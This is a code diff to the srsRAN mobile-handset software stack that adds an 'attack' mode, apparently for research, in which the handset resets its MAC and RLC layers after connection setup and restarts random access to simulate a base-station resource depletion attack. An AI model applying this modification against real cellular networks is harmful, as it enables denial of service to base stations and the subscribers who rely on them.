@@ -1029,10 +1029,12 @@ void rrc::send_con_setup_complete(srsran::unique_byte_buffer_t nas_msg)
   if (attack) {
     srsran::console("[Testtt] Simulating BTS resource depletion attack\n");
     srsran::console("[Testtt] Restarting RA procedure\n");
-    rrc::leave_connected();
+    //rrc::leave_connected();
     //mac->reset();
     //mac->pcch_start_rx();
-    rrc::radio_link_failure_process();
+    //rrc::radio_link_failure_process();
+    mac->reset();
+    rlc->reset();
   }
 }
 
@@ -2915,6 +2917,17 @@ uint32_t rrc::get_drb_id_for_eps_bearer(const uint32_t& eps_bearer_id)
 bool rrc::has_nr_dc()
 {
   return (args.release >= 15);
+}
+
+void rrc::restart_ra() 
+{
+  srsran::console("[Testtt] BTS resource depletion: Restarting RA procedure\n");
+  rrc::leave_connected();
+  //mac->reset();
+  //mac->pcch_start_rx();
+  //rrc::radio_link_failure_process();
+  //mac->reset();
+  //rlc->reset();
 }
 
 void rrc::add_mrb(uint32_t lcid, uint32_t port)
